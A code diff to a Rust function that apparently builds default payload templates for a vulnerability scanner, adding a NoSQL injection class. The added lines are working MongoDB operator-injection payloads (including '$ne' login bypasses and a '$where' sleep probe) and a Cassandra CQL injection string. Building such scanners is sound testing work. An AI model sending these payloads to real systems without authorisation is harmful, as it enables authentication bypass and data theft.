@@ -649,6 +649,26 @@ fn build_default_templates() -> Vec<(VulnerabilityClass, Vec<String>)> {
                 "aced0005737200176f72672e6170616368652e636f6d6d6f6e73".to_string(),
             ],
         ),
+        (
+            VulnerabilityClass::NoSqlInjection,
+            vec![
+                // MongoDB operator injection (JSON body)
+                "{\"$ne\": \"\"}".to_string(),
+                "{\"$gt\": \"\"}".to_string(),
+                "{\"$regex\": \".*\"}".to_string(),
+                "{\"$where\": \"1==1\"}".to_string(),
+                "{\"$where\": \"sleep(5000)\"}".to_string(),
+                "{\"$nin\": []}".to_string(),
+                "{\"username\": {\"$regex\": \"^a\"}}".to_string(),
+                // MongoDB operator injection (URL parameter form)
+                "username[$ne]=&password[$ne]=".to_string(),
+                "username[$gt]=&password[$gt]=".to_string(),
+                "username[$regex]=.*&password[$regex]=.*".to_string(),
+                "[$ne]=&password[$ne]=".to_string(),
+                // Cassandra CQL injection
+                "' OR 1=1 ALLOW FILTERING--".to_string(),
+            ],
+        ),
     ]
 }
 
